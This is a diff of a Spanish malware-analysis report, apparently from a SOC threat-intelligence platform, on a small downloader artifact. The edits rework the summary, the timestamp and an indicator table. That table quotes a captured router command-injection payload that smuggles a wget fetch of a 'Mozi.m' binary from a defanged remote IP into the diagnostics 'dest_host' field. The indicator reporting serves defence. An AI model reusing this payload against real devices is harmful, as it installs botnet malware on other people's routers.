@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 320 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Mozi.m+-O+-` en `hxxp://111.92.152.XXX:57968/Mozi.m+-O+-`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:42:54+00:00`
+- **Registrado:** `2026-08-09T19:42:54.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -50,10 +51,10 @@ XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://111.92
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 111.92.152.XXX | static_analysis |
 | url | hxxp://111.92.152.XXX:57968/Mozi.m+-O+- | strings |
-| hash | 3e787a5aac7c671b1aaec6116dcfff34db2cf5f2032e74b71a9728ca87b8704b | static_analysis |
+| ip | 111.92.152.XXX | static_analysis |
 | command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://111.92.152.XXX:57968/Mozi.m+-O+->/tmp/gpon80;s | strings |
+| hash | 3e787a5aac7c671b1aaec6116dcfff34db2cf5f2032e74b71a9728ca87b8704b | static_analysis |
 
 ## 🛡️ Nota de publicación
 
